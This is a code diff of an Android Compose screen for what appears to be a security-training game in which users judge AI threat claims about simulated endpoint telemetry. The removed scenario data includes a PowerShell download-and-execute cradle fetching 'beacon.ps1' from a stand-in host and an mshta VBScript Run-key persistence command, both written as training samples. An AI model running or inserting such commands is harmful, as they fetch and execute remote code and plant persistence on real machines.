@@ -20,14 +20,27 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.graphics.graphicsLayer
 import androidx.compose.ui.hapticfeedback.HapticFeedbackType
+import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.platform.LocalHapticFeedback
 import androidx.compose.ui.platform.testTag
 import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import com.example.ai.EdgeInferenceManager
+import com.example.audio.CyberSonificationManager
 import com.example.data.AegoraRepository
+import com.example.hardware.DynamicIconManager
 import com.example.subscription.AegoraSubscriptionRepository
+import com.example.ui.components.MatrixRainCanvas
+import com.example.ui.components.PalantirMatteButton
+import com.example.ui.components.ShimmerBox
+import com.example.ui.components.shimmerEffect
+import com.example.model.DuelScenario
+import com.example.model.ScapyParsedPacket
+import com.example.viewmodel.DuelArenaViewModel
+import com.example.viewmodel.DuelIntent
+import com.example.util.SocPdfReportGenerator
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 
@@ -50,6 +63,11 @@ fun DuelArenaScreen(
 
   val haptic = LocalHapticFeedback.current
   val coroutineScope = rememberCoroutineScope()
+  val context = LocalContext.current
+
+  val sonificationManager = remember { CyberSonificationManager.getInstance(context) }
+  var isGeigerMuted by remember { mutableStateOf(false) }
+  var isExportingPdf by remember { mutableStateOf(false) }
 
   val subscriptionState by AegoraSubscriptionRepository.subscriptionState.collectAsState()
   val duelsEngaged by AegoraSubscriptionRepository.adversaryDuelsEngaged.collectAsState()
@@ -57,247 +75,88 @@ fun DuelArenaScreen(
   val isPro = AegoraSubscriptionRepository.canAccessAdversaryDuel() ||
     subscriptionState.entitlementIdentifiers.contains(AegoraSubscriptionRepository.ENTITLEMENT_PRO)
 
-  var activeSeedIndex by remember { mutableIntStateOf(0) }
-  var hasDecodedPayload by remember { mutableStateOf(false) }
-  var duelOutcome by remember { mutableStateOf<String?>(null) }
-  var isCorrectDecision by remember { mutableStateOf<Boolean?>(null) }
-  var showPcapTrace by remember { mutableStateOf(false) }
-  var isStreamingPcap by remember { mutableStateOf(false) }
-  val streamedPackets = remember { mutableStateListOf<ScapyParsedPacket>() }
+  var isLoading by remember { mutableStateOf(false) }
+  val snackbarHostState = remember { SnackbarHostState() }
 
-  val duelSeeds = listOf(
-    DuelScenario(
-      id = "SEED_LAZARUS",
-      adversary = "Hidden Cobra (Lazarus)",
-      rawTelemetry = "> 14:18:44 Sysmon EDR [Event ID 3 - Network Connection]\n" +
-        "> Image: C:\\Windows\\System32\\svchost.exe (PID 912)\n" +
-        "> Protocol: tcp, Initiated: true\n" +
-        "> SourceIp: 10.0.4.18, SourcePort: 49822\n" +
-        "> DestinationIp: 20.190.159.23, DestinationPort: 443\n" +
-        "> DestinationHostname: login.microsoftonline.com\n" +
-        "> User: NT AUTHORITY\\SYSTEM",
-      decodedPayload = "DECODED TELEMETRY INSPECTION:\nStandard Azure Active Directory token refresh handshake. TLS 1.3 certificate signed by Microsoft RSA TLS CA 02.",
-      aiClaim = "High: Outbound beaconing to Lazarus C2 domain masquerading as Microsoft Graph.",
-      isAiHallucinating = true,
-      explanation = "AI Hallucination Caught! Destination IP resolves to legitimate Microsoft Entra ID authentication cluster. The AI misclassified standard OAuth renewal as an APT beacon.",
-      pcapPackets = listOf(
-        ScapyParsedPacket(
-          number = 1,
-          timestamp = "14:18:44.102",
-          protocol = "TCP",
-          flags = "[SYN]",
-          ethSrc = "00:0c:29:4f:8e:12",
-          ethDst = "00:50:56:c0:00:08",
-          ipSrc = "10.0.4.18:49822",
-          ipDst = "20.190.159.23:443",
-          layers = "Ethernet / IP / TCP",
-          summary = "Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM=1"
-        ),
-        ScapyParsedPacket(
-          number = 2,
-          timestamp = "14:18:44.128",
-          protocol = "TCP",
-          flags = "[SYN, ACK]",
-          ethSrc = "00:50:56:c0:00:08",
-          ethDst = "00:0c:29:4f:8e:12",
-          ipSrc = "20.190.159.23:443",
-          ipDst = "10.0.4.18:49822",
-          layers = "Ethernet / IP / TCP",
-          summary = "Seq=0 Ack=1 Win=65535 Len=0 MSS=1400"
-        ),
-        ScapyParsedPacket(
-          number = 3,
-          timestamp = "14:18:44.129",
-          protocol = "TCP",
-          flags = "[ACK]",
-          ethSrc = "00:0c:29:4f:8e:12",
-          ethDst = "00:50:56:c0:00:08",
-          ipSrc = "10.0.4.18:49822",
-          ipDst = "20.190.159.23:443",
-          layers = "Ethernet / IP / TCP",
-          summary = "Seq=1 Ack=1 Win=64240 Len=0 [3-Way Handshake Established]"
-        ),
-        ScapyParsedPacket(
-          number = 4,
-          timestamp = "14:18:44.135",
-          protocol = "TLS",
-          flags = "[PSH, ACK]",
-          ethSrc = "00:0c:29:4f:8e:12",
-          ethDst = "00:50:56:c0:00:08",
-          ipSrc = "10.0.4.18:49822",
-          ipDst = "20.190.159.23:443",
-          layers = "Ethernet / IP / TCP / TLS / ClientHello",
-          summary = "TLSv1.3 Handshake Client Hello [SNI: login.microsoftonline.com]",
-          payloadHex = "16 03 01 02 00 01 00 01 fc 03 03...",
-          payloadAscii = "...login.microsoftonline.com..."
-        ),
-        ScapyParsedPacket(
-          number = 5,
-          timestamp = "14:18:44.180",
-          protocol = "TLS",
-          flags = "[PSH, ACK]",
-          ethSrc = "00:50:56:c0:00:08",
-          ethDst = "00:0c:29:4f:8e:12",
-          ipSrc = "20.190.159.23:443",
-          ipDst = "10.0.4.18:49822",
-          layers = "Ethernet / IP / TCP / TLS / ServerHello",
-          summary = "TLSv1.3 Server Hello + Certificate [Issuer: Microsoft RSA TLS CA 02]",
-          payloadHex = "16 03 03 00 7a 02 00 00 76 03 03...",
-          payloadAscii = "...CN=Microsoft RSA TLS CA 02..."
-        )
-      )
-    ),
-    DuelScenario(
-      id = "SEED_APT29",
-      adversary = "Cozy Bear (APT29)",
-      rawTelemetry = "> 09:34:02 Sysmon EDR [Event ID 1]\n" +
-        "> ProcessGuid: {8f3e-4412-98ab-001}\n" +
-        "> Image: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE (PID 4412)\n" +
-        "> CommandLine: WINWORD.EXE /n \"C:\\Users\\victim\\Documents\\Invoice_982.docm\"\n" +
-        "> ParentProcessGuid: {1a2b-3c4d-5e6f-7890}\n" +
-        "> TargetFilename: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (PID 6108)\n" +
-        "> ProcessCommandLine: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgA...",
-      decodedPayload = "DECODED (-EncodedCommand):\nIEX (New-Object System.Net.WebClient).DownloadString('https://telemetry-cdn.internal-azure.net/beacon.ps1'); # Cobalt Strike Stager V4.9 - Port 443 HTTPS",
-      aiClaim = "Critical: Cobalt Strike beaconing detected via encoded PowerShell execution.",
-      isAiHallucinating = false,
-      explanation = "Accurate Detection! WINWORD.EXE spawning an encoded hidden PowerShell process contacting an unverified CDN endpoint matches MITRE T1059.001 & T1071.001.",
-      pcapPackets = listOf(
-        ScapyParsedPacket(
-          number = 1,
-          timestamp = "09:34:02.040",
-          protocol = "TCP",
-          flags = "[SYN]",
-          ethSrc = "00:0c:29:4f:8e:12",
-          ethDst = "fe:00:1a:2b:3c:4d",
-          ipSrc = "10.0.4.18:51204",
-          ipDst = "185.220.101.42:443",
-          layers = "Ethernet / IP / TCP",
-          summary = "Seq=0 Win=64240 Len=0 MSS=1460"
-        ),
-        ScapyParsedPacket(
-          number = 2,
-          timestamp = "09:34:02.088",
-          protocol = "TCP",
-          flags = "[SYN, ACK]",
-          ethSrc = "fe:00:1a:2b:3c:4d",
-          ethDst = "00:0c:29:4f:8e:12",
-          ipSrc = "185.220.101.42:443",
-          ipDst = "10.0.4.18:51204",
-          layers = "Ethernet / IP / TCP",
-          summary = "Seq=0 Ack=1 Win=14600 Len=0"
-        ),
-        ScapyParsedPacket(
-          number = 3,
-          timestamp = "09:34:02.089",
-          protocol = "TCP",
-          flags = "[ACK]",
-          ethSrc = "00:0c:29:4f:8e:12",
-          ethDst = "fe:00:1a:2b:3c:4d",
-          ipSrc = "10.0.4.18:51204",
-          ipDst = "185.220.101.42:443",
-          layers = "Ethernet / IP / TCP",
-          summary = "Seq=1 Ack=1 Win=64240 Len=0 [Handshake Complete]"
-        ),
-        ScapyParsedPacket(
-          number = 4,
-          timestamp = "09:34:02.115",
-          protocol = "HTTP",
-          flags = "[PSH, ACK]",
-          ethSrc = "00:0c:29:4f:8e:12",
-          ethDst = "fe:00:1a:2b:3c:4d",
-          ipSrc = "10.0.4.18:51204",
-          ipDst = "185.220.101.42:443",
-          layers = "Ethernet / IP / TCP / Raw",
-          summary = "GET /beacon.ps1 HTTP/1.1 (Host: telemetry-cdn.internal-azure.net)",
-          payloadHex = "47 45 54 20 2f 62 65 61 63 6f 6e 2e 70 73 31...",
-          payloadAscii = "GET /beacon.ps1 HTTP/1.1\r\nHost: telemetry-cdn.internal-azure.net\r\n...",
-          isSuspicious = true
-        ),
-        ScapyParsedPacket(
-          number = 5,
-          timestamp = "09:34:02.164",
-          protocol = "RAW",
-          flags = "[PSH, ACK]",
-          ethSrc = "fe:00:1a:2b:3c:4d",
-          ethDst = "00:0c:29:4f:8e:12",
-          ipSrc = "185.220.101.42:443",
-          ipDst = "10.0.4.18:51204",
-          layers = "Ethernet / IP / TCP / Raw",
-          summary = "Cobalt Strike HTTPS Stager Ingestion [Length: 512 bytes]",
-          payloadHex = "49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74...",
-          payloadAscii = "IEX (New-Object System.Net.WebClient).DownloadString('https://telemetry-cdn.internal-azure.net/beacon.ps1'); # Stager V4.9",
-          isSuspicious = true
-        )
-      )
-    ),
-    DuelScenario(
-      id = "SEED_FIN7",
-      adversary = "Carbanak / FIN7",
-      rawTelemetry = "> 22:04:11 EDR FileCreate [Event ID 11]\n" +
-        "> Image: mshta.exe (PID 3304)\n" +
-        "> TargetFilename: C:\\ProgramData\\Windows\\perflogs\\cache.vbs\n" +
-        "> CommandLine: mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -ep bypass -f cache.vbs\"\",0\"))",
-      decodedPayload = "DECODED SCRIPT:\nDim obj: Set obj = WScript.CreateObject(\"WScript.Shell\"): obj.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TelemetrySync\", \"cache.vbs\"",
-      aiClaim = "Critical: Living-Off-The-Land (LOLBin) mshta persistence via Run key registry injection.",
-      isAiHallucinating = false,
-      explanation = "Correct! The AI correctly identified mshta.exe executing inline VBScript to drop persistent registry execution in HKCU Run key.",
-      pcapPackets = listOf(
-        ScapyParsedPacket(
-          number = 1,
-          timestamp = "22:04:11.012",
-          protocol = "TCP",
-          flags = "[SYN]",
-          ethSrc = "00:0c:29:4f:8e:12",
-          ethDst = "c4:72:95:81:0b:33",
-          ipSrc = "10.0.4.18:50811",
-          ipDst = "194.26.29.112:8080",
-          layers = "Ethernet / IP / TCP",
-          summary = "Seq=0 Win=64240 Len=0 MSS=1460"
-        ),
-        ScapyParsedPacket(
-          number = 2,
-          timestamp = "22:04:11.054",
-          protocol = "TCP",
-          flags = "[SYN, ACK]",
-          ethSrc = "c4:72:95:81:0b:33",
-          ethDst = "00:0c:29:4f:8e:12",
-          ipSrc = "194.26.29.112:8080",
-          ipDst = "10.0.4.18:50811",
-          layers = "Ethernet / IP / TCP",
-          summary = "Seq=0 Ack=1 Win=29200 Len=0"
-        ),
-        ScapyParsedPacket(
-          number = 3,
-          timestamp = "22:04:11.091",
-          protocol = "HTTP",
-          flags = "[PSH, ACK]",
-          ethSrc = "c4:72:95:81:0b:33",
-          ethDst = "00:0c:29:4f:8e:12",
-          ipSrc = "194.26.29.112:8080",
-          ipDst = "10.0.4.18:50811",
-          layers = "Ethernet / IP / TCP / Raw",
-          summary = "HTTP 200 OK - cache.vbs dropper binary payload payload stream",
-          payloadHex = "44 69 6d 20 6f 62 6a 3a 20 53 65 74...",
-          payloadAscii = "Dim obj: Set obj = WScript.CreateObject(\"WScript.Shell\")...",
-          isSuspicious = true
-        )
-      )
-    )
-  )
+  val viewModel = remember { DuelArenaViewModel(context) }
+  val uiState by viewModel.viewState.collectAsState()
+  val duelSeeds = DuelArenaViewModel.DEFAULT_SCENARIOS
 
-  val currentScenario = duelSeeds[activeSeedIndex % duelSeeds.size]
+  val activeSeedIndex = uiState.activeSeedIndex
+  val currentScenario = uiState.scenario
+  val hasDecodedPayload = uiState.hasDecodedPayload
+  val duelOutcome = uiState.duelOutcome
+  val isCorrectDecision = uiState.isCorrectDecision
+  val showPcapTrace = uiState.showPcapTrace
+  val isStreamingPcap = uiState.isStreamingPcap
+  val streamedPackets = uiState.streamedPackets
+
+  // Edge AI Neural Fallback Check
+  val isDeviceOffline = remember(activeSeedIndex) { !EdgeInferenceManager.isOnline(context) }
+  val edgeAiInference = remember(activeSeedIndex, isDeviceOffline) {
+    if (isDeviceOffline) {
+      EdgeInferenceManager.inferEdgeTelemetry(
+        telemetryLog = currentScenario.rawTelemetry,
+        adversary = currentScenario.adversary,
+        threatScore = currentScenario.threatScore
+      )
+    } else null
+  }
+
+  // Active claim text: dynamically shows offline Edge Neural engine text if offline
+  val effectiveAiClaim = edgeAiInference?.analysisSummary ?: currentScenario.aiClaim
+
+  // Cyber Sonification (The Geiger Counter Effect):
+  // Frequency/speed accelerates mathematically as ThreatScore approaches 100/100
+  DisposableEffect(currentScenario.threatScore, isGeigerMuted) {
+    sonificationManager.setMuted(isGeigerMuted)
+    sonificationManager.startGeigerMonitoring(currentScenario.threatScore)
+    onDispose {
+      sonificationManager.stopGeigerMonitoring()
+    }
+  }
+
+  // Dynamic App Icon integration: Updates launcher icon state based on threat severity
+  LaunchedEffect(currentScenario.threatScore) {
+    DynamicIconManager.updateIconForThreatScore(context, currentScenario.threatScore)
+  }
+
+  fun exportDossierPdf() {
+    haptic.performHapticFeedback(HapticFeedbackType.LongPress)
+    isExportingPdf = true
+    coroutineScope.launch {
+      delay(200)
+      val reportData = SocPdfReportGenerator.DossierData(
+        reportId = currentScenario.id,
+        adversaryName = currentScenario.adversary,
+        aiClaim = effectiveAiClaim,
+        threatScore = currentScenario.threatScore,
+        killChainStage = currentScenario.mitreKillChainStage,
+        forensicEvidence = if (showPcapTrace && streamedPackets.isNotEmpty()) {
+          streamedPackets.take(5).joinToString("\n") { 
+            "#${it.number} [${it.timestamp}] ${it.protocol} | ${it.summary}" 
+          }
+        } else {
+          currentScenario.rawTelemetry
+        },
+        aiAnalystVerdict = duelOutcome ?: currentScenario.explanation,
+        isVerifiedThreat = !currentScenario.isAiHallucinating,
+        isEdgeAiFallback = isDeviceOffline
+      )
+
+      val pdfFile = SocPdfReportGenerator.generateDossierPdf(context, reportData)
+      isExportingPdf = false
+      if (pdfFile != null) {
+        SocPdfReportGenerator.shareDossier(context, pdfFile)
+        snackbarHostState.showSnackbar("Dossier PDF Exported: ${pdfFile.name}")
+      } else {
+        snackbarHostState.showSnackbar("PDF Generation Encountered an Anomaly.")
+      }
+    }
+  }
 
   fun ingestPcapTrace() {
-    showPcapTrace = true
-    streamedPackets.clear()
-    isStreamingPcap = true
-    coroutineScope.launch {
-      for (pkt in currentScenario.pcapPackets) {
-        delay(120)
-        streamedPackets.add(pkt)
-      }
-      isStreamingPcap = false
-    }
+    viewModel.processIntent(DuelIntent.TogglePcapTrace)
   }
 
   fun handleDuelDecision(userAcceptedClaim: Boolean) {
@@ -309,37 +168,32 @@ fun DuelArenaScreen(
 
     // Record usage
     AegoraSubscriptionRepository.recordDuelEngaged()
+    viewModel.processIntent(
+      DuelIntent.SubmitDecision(
+        claimedHallucination = !userAcceptedClaim,
+        context = context
+      )
+    )
+  }
 
-    val correct = if (userAcceptedClaim) {
-      !currentScenario.isAiHallucinating
-    } else {
-      currentScenario.isAiHallucinating
-    }
-
-    isCorrectDecision = correct
-    if (correct) {
-      AegoraRepository.awardExperience(120)
-      duelOutcome = if (userAcceptedClaim) {
-        "EXACT MATCH (+120 XP): You verified the AI analyst claim! ${currentScenario.explanation}"
-      } else {
-        "[AI FAILURE DETECTED ✓] HALLUCINATION BUSTED (+120 XP): Outstanding telemetry analysis! ${currentScenario.explanation}"
-      }
-    } else {
-      duelOutcome = if (userAcceptedClaim) {
-        "MISIDENTIFICATION: The AI hallucinated this threat. ${currentScenario.explanation}"
-      } else {
-        "MISSED THREAT: The AI claim was accurate. Raw telemetry confirmed an active adversary technique."
-      }
+  fun triggerSimulatedSync() {
+    coroutineScope.launch {
+      snackbarHostState.showSnackbar("Secure Connection Lost. Retrying...")
     }
   }
 
-  Column(
+  Box(
     modifier = modifier
       .fillMaxSize()
       .background(obsidianBg)
-      .padding(16.dp),
-    verticalArrangement = Arrangement.spacedBy(16.dp)
   ) {
+    Column(
+      modifier = Modifier
+        .fillMaxSize()
+        .safeDrawingPadding()
+        .padding(16.dp),
+      verticalArrangement = Arrangement.spacedBy(16.dp)
+    ) {
     // Top Navigation & Header Row
     Row(
       modifier = Modifier.fillMaxWidth(),
@@ -363,32 +217,97 @@ fun DuelArenaScreen(
         )
       }
 
-      // RevenueCat Entitlement & Quota Pill
-      Surface(
-        onClick = onShowPaywall,
-        shape = RoundedCornerShape(12.dp),
-        color = if (isPro) Color(0x222962FF) else Color(0x2200E676),
-        border = BorderStroke(1.dp, if (isPro) cobaltBlue else Color(0x4400E676)),
-        modifier = Modifier.testTag("duel_paywall_pill")
+      Row(
+        verticalAlignment = Alignment.CenterVertically,
+        horizontalArrangement = Arrangement.spacedBy(8.dp)
       ) {
-        Row(
-          modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
-          verticalAlignment = Alignment.CenterVertically,
-          horizontalArrangement = Arrangement.spacedBy(4.dp)
+        // Geiger Sonification Audio Toggle
+        IconButton(
+          onClick = {
+            isGeigerMuted = !isGeigerMuted
+            sonificationManager.setMuted(isGeigerMuted)
+            haptic.performHapticFeedback(HapticFeedbackType.TextHandleMove)
+          },
+          modifier = Modifier
+            .size(32.dp)
+            .testTag("geiger_audio_toggle_button")
         ) {
           Icon(
-            if (isPro) Icons.Default.WorkspacePremium else Icons.Default.Bolt,
-            contentDescription = null,
-            tint = if (isPro) cobaltBlue else Color(0xFF00E676),
+            if (isGeigerMuted) Icons.Default.VolumeOff else Icons.Default.VolumeUp,
+            contentDescription = if (isGeigerMuted) "Unmute Geiger" else "Mute Geiger",
+            tint = if (isGeigerMuted) Color(0xFF8A919E) else Color(0xFF34D399),
+            modifier = Modifier.size(20.dp)
+          )
+        }
+
+        // RevenueCat Entitlement & Quota Pill
+        Surface(
+          onClick = onShowPaywall,
+          shape = RoundedCornerShape(12.dp),
+          color = if (isPro) Color(0x222962FF) else Color(0x2200E676),
+          border = BorderStroke(1.dp, if (isPro) cobaltBlue else Color(0x4400E676)),
+          modifier = Modifier.testTag("duel_paywall_pill")
+        ) {
+          Row(
+            modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
+            verticalAlignment = Alignment.CenterVertically,
+            horizontalArrangement = Arrangement.spacedBy(4.dp)
+          ) {
+            Icon(
+              if (isPro) Icons.Default.WorkspacePremium else Icons.Default.Bolt,
+              contentDescription = null,
+              tint = if (isPro) cobaltBlue else Color(0xFF00E676),
+              modifier = Modifier.size(14.dp)
+            )
+            Text(
+              text = if (subscriptionState.tier != com.example.model.SubscriptionTier.FREE) "PRO • UNLIMITED" else "${2 - duelsEngaged}/2 DUELS LEFT",
+              fontSize = 10.sp,
+              fontWeight = FontWeight.Bold,
+              color = Color.White
+            )
+          }
+        }
+      }
+    }
+
+    // Phase 26: UDF State Invariance Watchdog Verification Badge
+    Surface(
+      shape = RoundedCornerShape(6.dp),
+      color = if (uiState.isWatchdogHealthy) Color(0x1500E676) else Color(0x22FF1744),
+      border = BorderStroke(1.dp, if (uiState.isWatchdogHealthy) Color(0x3300E676) else Color(0x66FF1744)),
+      modifier = Modifier
+        .fillMaxWidth()
+        .testTag("state_watchdog_indicator")
+    ) {
+      Row(
+        modifier = Modifier.padding(horizontal = 10.dp, vertical = 6.dp),
+        verticalAlignment = Alignment.CenterVertically,
+        horizontalArrangement = Arrangement.SpaceBetween
+      ) {
+        Row(
+          verticalAlignment = Alignment.CenterVertically,
+          horizontalArrangement = Arrangement.spacedBy(6.dp)
+        ) {
+          Icon(
+            imageVector = if (uiState.isWatchdogHealthy) Icons.Default.Shield else Icons.Default.Warning,
+            contentDescription = "State Watchdog",
+            tint = if (uiState.isWatchdogHealthy) Color(0xFF00E676) else Color(0xFFFF1744),
             modifier = Modifier.size(14.dp)
           )
           Text(
-            text = if (subscriptionState.tier != com.example.model.SubscriptionTier.FREE) "PRO • UNLIMITED" else "${2 - duelsEngaged}/2 DUELS LEFT",
+            text = "STATE WATCHDOG: [SHA-256: ${uiState.stateHash.take(8).uppercase()}] • THREAT: ${uiState.threatScore}/100",
             fontSize = 10.sp,
+            fontFamily = FontFamily.Monospace,
             fontWeight = FontWeight.Bold,
-            color = Color.White
+            color = if (uiState.isWatchdogHealthy) Color(0xFFD1D5DB) else Color(0xFFFF80AB)
           )
         }
+        Text(
+          text = if (uiState.lastRehydrationTimestamp > 0) "[SELF-HEALED DB]" else "[INVARIANT VERIFIED]",
+          fontSize = 9.sp,
+          fontFamily = FontFamily.Monospace,
+          color = Color(0xFF00E676)
+        )
       }
     }
 
@@ -407,11 +326,7 @@ fun DuelArenaScreen(
             .weight(1f)
             .clickable {
               haptic.performHapticFeedback(HapticFeedbackType.TextHandleMove)
-              activeSeedIndex = index
-              duelOutcome = null
-              hasDecodedPayload = false
-              showPcapTrace = false
-              streamedPackets.clear()
+              viewModel.processIntent(DuelIntent.LoadScenario(index))
             }
         ) {
           Text(
@@ -460,10 +375,13 @@ fun DuelArenaScreen(
               fontFamily = FontFamily.Monospace
             )
             if (isStreamingPcap) {
-              CircularProgressIndicator(
-                modifier = Modifier.size(10.dp),
-                color = Color(0xFF22D3EE),
-                strokeWidth = 1.5.dp
+              ShimmerBox(
+                modifier = Modifier
+                  .width(28.dp)
+                  .height(10.dp),
+                shape = RoundedCornerShape(2.dp),
+                baseColor = Color(0xFF0E2238),
+                highlightColor = Color(0xFF22D3EE)
               )
             }
           }
@@ -506,7 +424,7 @@ fun DuelArenaScreen(
               fontFamily = FontFamily.Monospace,
               modifier = Modifier.clickable {
                 haptic.performHapticFeedback(HapticFeedbackType.TextHandleMove)
-                hasDecodedPayload = !hasDecodedPayload
+                viewModel.processIntent(DuelIntent.TogglePayloadDecode)
               }
             )
           }
@@ -641,34 +559,117 @@ fun DuelArenaScreen(
       }
     }
 
-    // AI Analyst Claim Card
+    // AI Analyst Claim Card with MITRE ATT&CK Kill Chain
     Card(
       colors = CardDefaults.cardColors(containerColor = matteSteel),
       shape = RoundedCornerShape(8.dp),
-      border = BorderStroke(1.dp, slateBorder),
+      border = BorderStroke(1.dp, if (isLoading) Color(0xFF34D399) else slateBorder),
       modifier = Modifier
         .wrapContentHeight()
         .testTag("ai_analyst_claim_card")
     ) {
-      Column(
-        modifier = Modifier.padding(16.dp),
-        verticalArrangement = Arrangement.spacedBy(8.dp)
-      ) {
-        Row(
-          modifier = Modifier.fillMaxWidth(),
-          horizontalArrangement = Arrangement.SpaceBetween,
-          verticalAlignment = Alignment.CenterVertically
+      Box(modifier = Modifier.fillMaxWidth()) {
+        Column(
+          modifier = Modifier.padding(16.dp),
+          verticalArrangement = Arrangement.spacedBy(10.dp)
         ) {
-          Text("AI ANALYST CLAIM", color = Color(0xFF8A919E), fontSize = 10.sp, fontWeight = FontWeight.Bold)
-          Text("CONFIDENCE: 94.2%", color = Color(0xFF2962FF), fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+          Row(
+            modifier = Modifier.fillMaxWidth(),
+            horizontalArrangement = Arrangement.SpaceBetween,
+            verticalAlignment = Alignment.CenterVertically
+          ) {
+            Text(
+              if (isLoading) "NEURAL PROCESSING // MITRE ATT&CK" 
+              else if (isDeviceOffline) "EDGE AI HEURISTIC ENGINE // OFFLINE" 
+              else "AI ANALYST CLAIM",
+              color = if (isLoading) Color(0xFF34D399) 
+                else if (isDeviceOffline) Color(0xFFF59E0B) 
+                else Color(0xFF8A919E),
+              fontSize = 10.sp,
+              fontWeight = FontWeight.Bold,
+              fontFamily = FontFamily.Monospace
+            )
+            Text(
+              if (isLoading) "[FASTAPI STREAMING]" 
+              else if (isDeviceOffline) "[AIR-GAPPED FALLBACK]" 
+              else "CONFIDENCE: 94.2%",
+              color = if (isLoading) Color(0xFF34D399) 
+                else if (isDeviceOffline) Color(0xFFF59E0B) 
+                else Color(0xFF2962FF),
+              fontSize = 10.sp,
+              fontFamily = FontFamily.Monospace
+            )
+          }
+
+          // MITRE ATT&CK Horizontal Kill Chain Timeline (Recon -> Delivery -> Exploit -> C2)
+          val killChainStages = listOf("Recon", "Delivery", "Exploit", "C2")
+          val activeStage = currentScenario.mitreKillChainStage
+          Row(
+            modifier = Modifier
+              .fillMaxWidth()
+              .testTag("mitre_kill_chain_timeline"),
+            horizontalArrangement = Arrangement.spacedBy(4.dp),
+            verticalAlignment = Alignment.CenterVertically
+          ) {
+            killChainStages.forEachIndexed { index, stage ->
+              val isCurrentStage = stage.equals(activeStage, ignoreCase = true)
+              Surface(
+                modifier = Modifier.weight(1f),
+                shape = RoundedCornerShape(4.dp),
+                color = if (isCurrentStage) Color(0x33EF4444) else Color(0x1F2D313A),
+                border = BorderStroke(
+                  1.dp,
+                  if (isCurrentStage) Color(0xFFEF4444) else Color(0xFF2D313A)
+                )
+              ) {
+                Box(
+                  modifier = Modifier.padding(vertical = 5.dp),
+                  contentAlignment = Alignment.Center
+                ) {
+                  Text(
+                    text = stage.uppercase(),
+                    fontSize = 9.sp,
+                    fontWeight = if (isCurrentStage) FontWeight.Black else FontWeight.Normal,
+                    fontFamily = FontFamily.Monospace,
+                    color = if (isCurrentStage) Color(0xFFEF4444) else Color(0xFF8A919E)
+                  )
+                }
+              }
+              if (index < killChainStages.size - 1) {
+                Text(
+                  text = "›",
+                  color = Color(0xFF4A5568),
+                  fontSize = 12.sp,
+                  fontWeight = FontWeight.Bold
+                )
+              }
+            }
+          }
+
+          Text(
+            if (isLoading) "Intercepting neural inference stream from FastAPI defense backend..." else effectiveAiClaim,
+            color = if (isLoading) Color(0xFFA7F3D0) else Color.White,
+            fontSize = 14.sp,
+            lineHeight = 20.sp,
+            fontWeight = FontWeight.Medium,
+            fontFamily = if (isLoading) FontFamily.Monospace else FontFamily.Default
+          )
         }
-        Text(
-          currentScenario.aiClaim,
-          color = Color.White,
-          fontSize = 14.sp,
-          lineHeight = 20.sp,
-          fontWeight = FontWeight.Medium
-        )
+
+        // Dynamic Hacking Animation: Matrix-Style Rain Canvas while processing
+        if (isLoading) {
+          Box(
+            modifier = Modifier
+              .matchParentSize()
+              .background(Color(0xCC090A0C))
+          ) {
+            MatrixRainCanvas(
+              modifier = Modifier.fillMaxSize(),
+              primaryColor = Color(0xFF34D399),
+              leadColor = Color(0xFFE6FFFA)
+            )
+          }
+        }
       }
     }
 
@@ -729,68 +730,131 @@ fun DuelArenaScreen(
       }
     }
 
+    // Phase 26: Watchdog Fault-Injection / Re-Hydration Integrity Trigger
+    Row(
+      modifier = Modifier.fillMaxWidth(),
+      horizontalArrangement = Arrangement.SpaceBetween,
+      verticalAlignment = Alignment.CenterVertically
+    ) {
+      Text(
+        text = "INVARIANCE AUDIT: ${if (uiState.isWatchdogHealthy) "INTEGRITY 100% (ZERO DRIFT)" else "ANOMALY RECOVERY ACTIVE"}",
+        fontSize = 10.sp,
+        fontFamily = FontFamily.Monospace,
+        color = if (uiState.isWatchdogHealthy) Color(0xFF9CA3AF) else Color(0xFFF87171)
+      )
+      Text(
+        text = "[SIMULATE REHYDRATION]",
+        fontSize = 10.sp,
+        fontFamily = FontFamily.Monospace,
+        fontWeight = FontWeight.Bold,
+        color = Color(0xFF38BDF8),
+        modifier = Modifier
+          .clickable {
+            haptic.performHapticFeedback(HapticFeedbackType.TextHandleMove)
+            viewModel.simulateProcessDeath()
+          }
+          .testTag("simulate_process_death_button")
+      )
+    }
+
     // Action Row
     Row(
       modifier = Modifier.fillMaxWidth(),
-      horizontalArrangement = Arrangement.spacedBy(12.dp)
+      horizontalArrangement = Arrangement.spacedBy(10.dp)
     ) {
-      Button(
+      PalantirMatteButton(
+        text = "ACCEPT CLAIM",
         onClick = {
-          haptic.performHapticFeedback(HapticFeedbackType.TextHandleMove)
-          handleDuelDecision(userAcceptedClaim = true)
+          if (!isLoading) {
+            isLoading = true
+            try {
+              handleDuelDecision(userAcceptedClaim = true)
+            } finally {
+              isLoading = false
+            }
+          }
         },
-        modifier = Modifier
-          .weight(1f)
-          .height(50.dp)
-          .testTag("duel_accept_claim_button"),
-        colors = ButtonDefaults.buttonColors(containerColor = matteSteel),
+        enabled = !isLoading,
+        isLoading = isLoading,
+        containerColor = matteSteel,
+        contentColor = Color.White,
+        borderColor = slateBorder,
         shape = RoundedCornerShape(8.dp),
-        border = BorderStroke(1.dp, slateBorder)
-      ) {
-        Text("ACCEPT CLAIM", color = Color.White, fontWeight = FontWeight.Bold)
-      }
-
-      Button(
-        onClick = {
-          haptic.performHapticFeedback(HapticFeedbackType.LongPress)
-          handleDuelDecision(userAcceptedClaim = false)
-        },
+        isMonospace = true,
+        testTag = "duel_accept_claim_button",
         modifier = Modifier
           .weight(1f)
           .height(50.dp)
-          .testTag("duel_challenge_ai_button"),
